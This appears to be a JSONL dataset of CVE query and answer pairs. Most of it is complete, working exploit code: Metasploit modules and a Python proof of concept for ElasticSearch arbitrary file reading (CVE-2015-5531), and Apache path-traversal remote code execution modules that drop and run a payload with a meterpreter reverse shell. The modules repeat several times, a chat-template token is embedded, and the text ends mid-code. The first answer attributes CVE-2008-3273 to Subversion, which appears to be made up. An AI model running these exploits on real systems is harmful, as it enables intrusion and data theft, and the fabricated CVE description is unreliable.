{"query": "CVE-2008-3273", "Answer": "CVE-2008-3273 refers to a buffer overflow vulnerability in Apache Subversion (SVN), a widely used version control system. This vulnerability exists due to insufficient bounds checking during the parsing of certain SVN URLs. An attacker could exploit this flaw by crafting malicious URLs designed to trigger the buffer overflow and potentially execute arbitrary code within the context of the targeted SVN server.To protect against this vulnerability, users should ensure they are running an updated version of Apache Subversion. The latest stable release, version 1.9.x, includes a patch addressing this issue. Users who cannot upgrade right away should consider implementing network security measures, such as firewalls or intrusion prevention systems, to block traffic containing the malicious URL patterns. Additionally, restricting access to the SVN server through strong authentication methods and limiting the use of external connections can reduce the risk of exposure."}
{"query": "CVE-2015-5531", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'json'class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',      'Description'    => %q{        'This module exploits a directory traversal vulnerability in        ElasticSearch, allowing an attacker to read arbitrary files        with JVM process privileges, through the Snapshot API.'      },      'References'     =>        [          ['CVE', '2015-5531'],          ['PACKETSTORM', '132721']        ],      'Author'         =>        [          'Benjamin Smith', # Vulnerability Discovery          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module        ],      'License'        => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(9200),        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [true, 'Traversal depth', 7])      ], self.class    )  end  def check_host(ip)    res1 = send_request_raw(      'method' => 'POST',      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),      'data'   => '{\"type\":\"fs\",\"settings\":{\"location\":\"dsr\"}}'    )    res2 = send_request_raw(      'method' => 'POST',      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),      'data'   => '{\"type\":\"fs\",\"settings\":{\"location\":\"dsr/snapshot-ev1l\"}}'    )    if res1.body.include?('true') && res2.body.include?('true')      return Exploit::CheckCode::Appears    end    Exploit::CheckCode::Safe  end  def read_file(file)    travs = '_snapshot/pwn/ev1l%2f'    payload = '../' * datastore['DEPTH']    travs << payload.gsub('/', '%2f')    travs << file.gsub('/', '%2f')    vprint_status(\"Retrieving file contents...\")    res = send_request_raw(      'method' => 'GET',      'uri'    => travs    )    if res && res.code == 400      return res.body    else      print_status(\"Server returned HTTP response code: #{res.code}\")      print_status(res.body)      return nil    end  end  def run_host(ip)    vprint_status(\"Checking if it's a vulnerable ElasticSearch\")    check_code = check_host(ip)    print_status(\"#{check_code.message}\")    if check_host(ip) != Exploit::CheckCode::Appears      return    end    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ %r{/^\\//}    contents = read_file(filename)    unless contents      print_error(\"No file downloaded\")      return    end    begin      data_hash = JSON.parse(contents)    rescue JSON::ParserError => e      elog(e)      return    end    fcontent = data_hash['error'].scan(/\\d+/).drop(2).map(&:to_i).pack('c*')    fname = datastore['FILEPATH']    path = store_loot(      'elasticsearch.traversal',      'text/plain',      ip,      fcontent,      fname    )    print_good(\"File saved in: #{path}\")  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'json'class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',      'Description'    => %q{        'This module exploits a directory traversal vulnerability in        ElasticSearch, allowing an attacker to read arbitrary files        with JVM process privileges, through the Snapshot API.'      },      'References'     =>        [          ['CVE', '2015-5531'],          ['PACKETSTORM', '132721']        ],      'Author'         =>        [          'Benjamin Smith', # Vulnerability Discovery          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module        ],      'License'        => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(9200),        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [true, 'Traversal depth', 7])      ], self.class    )  end  def check_host(ip)    res1 = send_request_raw(      'method' => 'POST',      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),      'data'   => '{\"type\":\"fs\",\"settings\":{\"location\":\"dsr\"}}'    )    res2 = send_request_raw(      'method' => 'POST',      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),      'data'   => '{\"type\":\"fs\",\"settings\":{\"location\":\"dsr/snapshot-ev1l\"}}'    )    if res1.body.include?('true') && res2.body.include?('true')      return Exploit::CheckCode::Appears    end    Exploit::CheckCode::Safe  end  def read_file(file)    travs = '_snapshot/pwn/ev1l%2f'    payload = '../' * datastore['DEPTH']    travs << payload.gsub('/', '%2f')    travs << file.gsub('/', '%2f')    vprint_status(\"Retrieving file contents...\")    res = send_request_raw(      'method' => 'GET',      'uri'    => travs    )    if res && res.code == 400      return res.body    else      print_status(\"Server returned HTTP response code: #{res.code}\")      print_status(res.body)      return nil    end  end  def run_host(ip)    vprint_status(\"Checking if it's a vulnerable ElasticSearch\")    check_code = check_host(ip)    print_status(\"#{check_code.message}\")    if check_host(ip) != Exploit::CheckCode::Appears      return    end    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ %r{/^\\//}    contents = read_file(filename)    unless contents      print_error(\"No file downloaded\")      return    end    begin      data_hash = JSON.parse(contents)    rescue JSON::ParserError => e      elog(e)      return    end    fcontent = data_hash['error'].scan(/\\d+/).drop(2).map(&:to_i).pack('c*')    fname = datastore['FILEPATH']    path = store_loot(      'elasticsearch.traversal',      'text/plain',      ip,      fcontent,      fname    )    print_good(\"File saved in: #{path}\")  endendEXPLOIT: # elasticpwn Script for ElasticSearch url path traversal vuln. CVE-2015-5531```[crg@fogheaven elasticpwn]$ python CVE-2015-5531.py exploitlab.int /etc/hosts!dSR script for CVE-2015-5531127.0.0.1 localhost# The following lines are desirable for IPv6 capable hosts::1 ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allroutersff02::3 ip6-allhostsThe script requires path.repo to be set into elasticsearch.yml and be writeable by elasticsearch process.In order to bypass the snapshot- prefix setted in the server side, we need to create a known relative path:curl http://exploitlab.int:9200/_snapshot/?pretty{  \"pwn\" : {    \"type\" : \"fs\",    \"settings\" : {      \"location\" : \"dsr\"    }  },  \"pwnie\" : {    \"type\" : \"fs\",    \"settings\" : {      \"location\" : \"dsr/snapshot-ev1l\"    }  }}We will use it later to access through path traversal url:trav = 'ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..'The file content it's represented as an array of ints, that needs to be translated into human readable:crg@exploitlab:~$ python elk-5531.py localhost /etc/issue!dSR script for CVE-2015-5531{u'status': 400, u'error': u'ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=26): [85, 98, 117, 110, 116, 117, 32, 49, 50, 46, 48, 52, 46, 53, 32, 76, 84, 83, 32, 92, 110, 32, 92, 108, 10, 10]]'}[85, 98, 117, 110, 116, 117, 32, 49, 50, 46, 48, 52, 46, 53, 32, 76, 84, 83, 32, 92, 110, 32, 92, 108, 10, 10] = Ubuntu 12.04.5 LTS \ \\lThere is also a path disclosure that could help exploiting in some scenarios:crg@exploitlab:~$ python elk-5531.py localhost /etc/passwda!dSR script for CVE-2015-5531{\"error\":\"SnapshotMissingException[[pwn:dsr/../../../../../../../../etc/passwda] is missing]; nested: FileNotFoundException[/var/tmp/dsr/snapshot-dsr/../../../../../../../../etc/passwda (No such file or directory)]; \",\"status\":404}```#!/usr/bin/env python# PoC for CVE-2015-5531 - Reported by Benjamin Smith# Affects ElasticSearch 1.6.0 and prior# Pedro Andujar || twitter: pandujar || email: @segfault.es || @digitalsec.net# Jose A. Guasch || twitter: @SecByDefault || jaguasch at gmail.com# Tested on default Linux (.deb) install || requires path.repo: to be set on config fileimport urllib, urllib2, json, sys, reprint \"!dSR script for CVE-2015-5531\\"if len(sys.argv) <> 3:        print \"Ex: %s www.example.com /etc/passwd\" % sys.argv[0]        sys.exit()host = sys.argv[1]fpath = urllib.quote(sys.argv[2], safe='')port = 9200trav = 'ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..'reponame = 'pwn'baseurl = \"http://%s:%s/_snapshot/\" % (host, port)xplurl = '%s%s/%s%s' % (baseurl, reponame, trav, fpath)def createSnapdirs():\ttry:\t\turl = \"%s/%s\" % (baseurl, reponame)\t\trequest = urllib2.Request(url, data='{\"type\":\"fs\",\"settings\":{\"location\":\"dsr\"}}')\t\trequest.get_method = lambda: 'POST'\t\turllib2.urlopen(request)        \turl = \"%s/%sie\" % (baseurl, reponame)\t        request = urllib2.Request(url, data='{\"type\":\"fs\",\"settings\":{\"location\":\"dsr/snapshot-ev1l\"}}')\t        request.get_method = lambda: 'POST'\t        urllib2.urlopen(request)\texcept urllib2.HTTPError, e: data = json.load(e)\t\tprint \"[!] ERROR: Verify path.repo exist in config file, elasticsearch.yml:\\"\t\tprint str(data['error'])\t\tsys.exit()def grabFile(xplurl):\ttry:\t\turllib2.urlopen(xplurl)\texcept urllib2.HTTPError, e:\t\tdata = json.load(e)\t\textrdata = re.findall(r'\\d+', str(data['error']))\t\tdecoder = bytearray()\t\tfor i in extrdata[+2:]:\t\t\tdecoder.append(int(i))\t\tprint decoderdef main():\tcreateSnapdirs()\tgrabFile(xplurl)if __name__ == \"__main__\":    main()       Question: CVE-2015-5531[/INST] CVE-2015-5531 is a vulnerability affecting ElasticSearch versions prior to 1.7.0. It is described as a directory traversal vulnerability where an attacker can read arbitrary files with JVM process privileges through the Snapshot API.To exploit this vulnerability, you would first need to ensure that the `path.repo` setting is configured correctly in the ElasticSearch configuration file (`elasticsearch.yml`) and is writable by the ElasticSearch process. Once that is confirmed, you can execute a Python script that creates necessary directories and then attempts to retrieve the desired file using a specially crafted URL containing a directory traversal sequence.Here's how the provided Metasploit module works:1. First, it checks whether the target ElasticSearch instance is vulnerable by sending two POST requests to specific paths. These requests should return a successful response indicating that the location parameter is set to 'dsr'.2. If the checks succeed, the module reads the specified file using a GET request to a carefully constructed URL containing a directory traversal sequence.3. Finally, the retrieved file content is stored in loot along with its original name and metadata.You can see the code snippet below demonstrating the functionality of the Metasploit module:```rubyclass MetasploitModule < Msf::Auxiliary  ...  def check_host(ip)    ...  end  def read_file(file)    ...  end  def run_host(ip)    ...  endend```Keep in mind that exploiting this vulnerability might lead to serious consequences, so always exercise caution when testing systems that do not belong to you."}
{"query": "CVE-2021-41773", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE scanner',        'Description' => %q{          This module scans for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).          If files outside of the document root are not protected by \u2018require all denied\u2019 and CGI has been explicitly enabled,          it can be used to execute arbitrary commands (Remote Command Execution).          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).        },        'References' => [          ['CVE', '2021-41773'],          ['CVE', '2021-42013'],          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']        ],        'Author' => [          'Ash Daulton', # Vulnerability discovery          'Dhiraj Mishra', # Metasploit auxiliary module          'mekhalleh (RAMELLA S\u00e9bastien)' # Metasploit exploit module (Zeop Entreprise)        ],        'DisclosureDate' => '2021-05-10',        'License' => MSF_LICENSE,        'DefaultOptions' => {          'RPORT' => 443,          'SSL' => true        },        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [REPEATABLE_SESSION],          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]        },        'Actions' => [          [            'CHECK_TRAVERSAL',            {              'Description' => 'Check for vulnerability.'            }          ],          [            'CHECK_RCE',            {              'Description' => 'Check for RCE (if mod_cgi is enabled).'            }          ],          [            'READ_FILE',            {              'Description' => 'Read file on the remote server.'            }          ]        ],        'DefaultAction' => 'CHECK_TRAVERSAL'      )    )    register_options([      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),      OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])    ])  end  def exec_traversal(cmd)    send_request_raw({      'method' => Rex::Text.rand_text_alpha(3..4),      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),      'data' => \"#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}\"    })  end  def message(msg)    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"  end  def pick_payload    case datastore['CVE']    when 'CVE-2021-41773'      payload = '.%2e/'    when 'CVE-2021-42013'      payload = '.%%32%65/'    else      payload = ''    end    payload  end  def read_traversal    send_request_raw({      'method' => 'GET',      'uri' => normalize_uri(@target_uri, @traversal.to_s)    })  end  def run_host(ip)    @proto = (ssl ? 'https' : 'http')    case action.name    when 'CHECK_TRAVERSAL'      @target_uri = datastore['TARGETURI']      @traversal = pick_payload * datastore['DEPTH'] << '/etc/passwd'      response = read_traversal      unless response        print_error(message('No response, target seems down.'))        return Exploit::CheckCode::Unknown      end      if response.code == 200 && response.body.include?('root:x:0:0:')        print_good(message(\"The target is vulnerable to #{datastore['CVE']}.\"))        vprint_status(\"Obtained HTTP response code #{response.code}.\")        report_vuln(          host: target_host,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end      print_error(message(\"The target is not vulnerable to #{datastore['CVE']}.\"))      return Exploit::CheckCode::Safe    when 'CHECK_RCE'      @traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'      rand_str = Rex::Text.rand_text_alpha(4..8)      response = exec_traversal(\"echo #{rand_str}\")      unless response        print_error(message('No response, target seems down.'))        return Exploit::CheckCode::Unknown      end      if response.code == 200 && response.body.include?(rand_str)        print_good(message(\"The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled).\"))        report_vuln(          host: target_host,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end      print_error(message(\"The target is not vulnerable to #{datastore['CVE']} (requires mod_cgi to be enabled).\"))      return Exploit::CheckCode::Safe    when 'READ_FILE'      fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?      @target_uri = datastore['TARGETURI']      @traversal = pick_payload * datastore['DEPTH'] << datastore['FILEPATH']      response = read_traversal      unless response        print_error(message('No response, target seems down.'))        return Exploit::CheckCode::Unknown      end      vprint_status(\"Obtained HTTP response code #{response.code}.\")      if response.code == 500        print_warning(message(\"The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled).\"))        report_vuln(          host: target_host,          name: name,          refs: references        )      end      if response.code == 500 || response.body.empty?        print_error('Nothing was downloaded')        return Exploit::CheckCode::Vulnerable if response.code == 500      end      if response.code == 200        vprint_good(\"#{peer} \#{response.body}\")        path = store_loot(          'apache.traversal',          'application/octet-stream',          ip,          response.body,          datastore['FILEPATH']        )        print_good(\"File saved in: #{path}\")        report_vuln(          host: target_host,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end      return Exploit::CheckCode::Safe    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::EXE  include Msf::Exploit::FileDropper  include Msf::Exploit::Remote::CheckModule  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE',        'Description' => %q{          This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).          If files outside of the document root are not protected by \u2018require all denied\u2019 and CGI has been explicitly enabled,          it can be used to execute arbitrary commands (Remote Command Execution).          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).        },        'References' => [          ['CVE', '2021-41773'],          ['CVE', '2021-42013'],          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']        ],        'Author' => [          'Ash Daulton', # Vulnerability discovery          'Dhiraj Mishra', # Metasploit auxiliary module          'mekhalleh (RAMELLA S\u00e9bastien)' # Metasploit exploit module (Zeop Entreprise)        ],        'DisclosureDate' => '2021-05-10',        'License' => MSF_LICENSE,        'Platform' => ['unix', 'linux'],        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],        'DefaultOptions' => {          'CheckModule' => 'auxiliary/scanner/http/apache_normalize_path',          'Action' => 'CHECK_RCE',          'RPORT' => 443,          'SSL' => true        },        'Targets' => [          [            'Automatic (Dropper)',            {              'Platform' => 'linux',              'Arch' => [ARCH_X64, ARCH_X86],              'Type' => :linux_dropper,              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp', 'DisablePayloadHandler' => 'false'              }            }          ],          [            'Unix Command (In-Memory)',            {              'Platform' => 'unix',              'Arch' => ARCH_CMD,              'Type' => :unix_command,              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/generic', 'DisablePayloadHandler' => 'true'              }            }          ],        ],        'DefaultTarget' => 0,        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [REPEATABLE_SESSION],          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]        }      )    )    register_options([      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])    ])  end  def cmd_unix_generic?    datastore['PAYLOAD'] == 'cmd/unix/generic'  end  def execute_command(command, _opts = {})    traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'    uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)    response = send_request_raw({      'method' => Rex::Text.rand_text_alpha(3..4),      'uri' => uri,      'data' => \"#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}\"    })    if response && response.body      return response.body    end    false  end  def message(msg)    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"  end  def pick_payload    case datastore['CVE']    when 'CVE-2021-41773'      payload = '.%2e/'    when 'CVE-2021-42013'      payload = '.%%32%65/'    else      payload = ''    end    payload  end  def exploit    @proto = (ssl ? 'https' : 'http')    if (!check.eql? Exploit::CheckCode::Vulnerable) && !datastore['ForceExploit']      fail_with(Failure::NotVulnerable, 'The target is not exploitable.')    end    print_status(message(\"Attempt to exploit for #{datastore['CVE']}\"))    case target['Type']    when :linux_dropper      file_name = \"/tmp/#{Rex::Text.rand_text_alpha(4..8)}\"      cmd = \"echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name}; rm -f #{file_name}\"      print_status(message(\"Sending #{datastore['PAYLOAD']} command payload\"))      vprint_status(message(\"Generated command payload: #{cmd}\"))      execute_command(cmd)      register_file_for_cleanup file_name    when :unix_command      vprint_status(message(\"Generated payload: #{payload.encoded}\"))      if !cmd_unix_generic?        execute_command(payload.encoded)      else        received = execute_command(payload.encoded.to_s)        print_warning(message('Dumping command output in response'))        if !received          print_error(message('Empty response, no command output'))          return        end        print_line(received)      end    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::EXE  include Msf::Exploit::FileDropper  include Msf::Exploit::Remote::CheckModule  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE',        'Description' => %q{          This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).          If files outside of the document root are not protected by \u2018require all denied\u2019 and CGI has been explicitly enabled,          it can be used to execute arbitrary commands (Remote Command Execution).          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).        },        'References' => [          ['CVE', '2021-41773'],          ['CVE', '2021-42013'],          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']        ],        'Author' => [          'Ash Daulton', # Vulnerability discovery          'Dhiraj Mishra', # Metasploit auxiliary module          'mekhalleh (RAMELLA S\u00e9bastien)' # Metasploit exploit module (Zeop Entreprise)        ],        'DisclosureDate' => '2021-05-10',        'License' => MSF_LICENSE,        'Platform' => ['unix', 'linux'],        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],        'DefaultOptions' => {          'CheckModule' => 'auxiliary/scanner/http/apache_normalize_path',          'Action' => 'CHECK_RCE',          'RPORT' => 443,          'SSL' => true        },        'Targets' => [          [            'Automatic (Dropper)',            {              'Platform' => 'linux',              'Arch' => [ARCH_X64, ARCH_X86],              'Type' => :linux_dropper,              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp', 'DisablePayloadHandler' => 'false'              }            }          ],          [            'Unix Command (In-Memory)',            {              'Platform' => 'unix',              'Arch' => ARCH_CMD,              'Type' => :unix_command,              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/generic', 'DisablePayloadHandler' => 'true'              }            }          ],        ],        'DefaultTarget' => 0,        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [REPEATABLE_SESSION],          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]        }      )    )    register_options([      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])    ])  end  def cmd_unix_generic?    datastore['PAYLOAD'] == 'cmd/unix/generic'  end  def execute_command(command, _opts = {})    traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'    uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)    response = send_request_raw({      'method' => Rex::Text.rand_text_alpha(3..4),      'uri' => uri,      'data' => \"#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}\"    })    if response && response.body      return response.body    end    false  end  def message(msg)    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"  end  def pick_payload    case datastore['CVE']    when 'CVE-2021-41773'      payload = '.%2e/'    when 'CVE-2021-42013'      payload = '.%%32%65/'    else      payload = ''    end    payload  end  def exploit    @proto = (ssl ? 'https' : 'http')    if (!check.eql? Exploit::CheckCode::Vulnerable) && !datastore['ForceExploit']      fail_with(Failure::NotVulnerable, 'The target is not exploitable.')    end    print_status(message(\"Attempt to exploit for #{datastore['CVE']}\"))    case target['Type']    when :linux_dropper      file_name = \"/tmp/#{Rex::Text.rand_text_alpha(4..8)}\"      cmd = \"echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name}; rm -f #{file_name}\"      print_status(message(\"Sending #{datastore['PAYLOAD']} command payload\"))      vprint_status(message(\"Generated command payload: #{cmd}\"))      execute_command(cmd)      register_file_for_cleanup file_name    when :unix_command      vprint_status(message(\"Generated payload: #{payload.encoded}\"))      if !cmd_unix_generic?        execute_command(payload.encoded)      else        received = execute_command(payload.encoded.to_s)        print_warning(message('Dumping command output in response'))        if !received          print_error(message('Empty response, no command output'))          return        end        print_line(received)      end    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE scanner',        'Description' => %q{          This module scans for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).          If files outside of the document root are not protected by \u2018require all denied\u2019 and CGI has been explicitly enabled,          it can be used to execute arbitrary commands (Remote Command Execution).          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).        },        'References' => [          ['CVE', '2021-41773'],          ['CVE', '2021-42013'],          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']        ],        'Author' => [          'Ash Daulton', # Vulnerability discovery          'Dhiraj Mishra', # Metasploit auxiliary module          'mekhalleh (RAMELLA S\u00e9bastien)' # Metasploit exploit module (Zeop Entreprise)        ],        'DisclosureDate' => '2021-05-10',        'License' => MSF_LICENSE,        'DefaultOptions' => {          'RPORT' => 443,          'SSL' => true        },        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [REPEATABLE_SESSION],          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]        },        'Actions' => [          [            'CHECK_TRAVERSAL',            {              'Description' => 'Check for vulnerability.'            }          ],          [            'CHECK_RCE',            {              'Description' => 'Check for RCE (if mod_cgi is enabled).'            }          ],          [            'READ_FILE',            {              'Description' => 'Read file on the remote server.'            }          ]        ],        'DefaultAction' => 'CHECK_TRAVERSAL'      )    )    register_options([      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),      OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])    ])  end  def exec_traversal(cmd)    send_request_raw({      'method' => Rex::Text.rand_text_alpha(3..4),      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),      'data' => \"#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}\"    })  end  def message(msg)    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"  end  def pick_payload    case datastore['CVE']    when 'CVE-2021-41773'      payload = '.%2e/'    when 'CVE-2021-42013'      payload = '.%%32%65/'    else      payload = ''    end    payload  end  def read_traversal    send_request_raw({      'method' => 'GET',      'uri' => normalize_uri(@target_uri, @traversal.to_s)    })  end  def run_host(ip)    @proto = (ssl ? 'https' : 'http')    case action.name    when 'CHECK_TRAVERSAL'      @target_uri = datastore['TARGETURI']      @traversal = pick_payload * datastore['DEPTH'] << '/etc/passwd'      response = read_traversal      unless response        print_error(message('No response, target seems down.'))        return Exploit::CheckCode::Unknown      end      if response.code == 200 && response.body.include?('root:x:0:0:')        print_good(message(\"The target is vulnerable to #{datastore['CVE']}.\"))        vprint_status(\"Obtained HTTP response code #{response.code}.\")        report_vuln(          host: target_host,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end      print_error(message(\"The target is not vulnerable to #{datastore['CVE']}.\"))      return Exploit::CheckCode::Safe    when 'CHECK_RCE'      @traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'      rand_str = Rex::Text.rand_text_alpha(4..8)      response = exec_traversal(\"echo #{rand_str}\")      unless response        print_error(message('No response, target seems down.'))        return Exploit::CheckCode::Unknown      end      if response.code == 200 && response.body.include?(rand_str)        print_good(message(\"The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled).\"))        report_vuln(          host: target_host,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end      print_error(message(\"The target is not vulnerable to #{datastore['CVE']} (requires mod_cgi to be enabled).\"))      return Exploit::CheckCode::Safe    when 'READ_FILE'      fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?      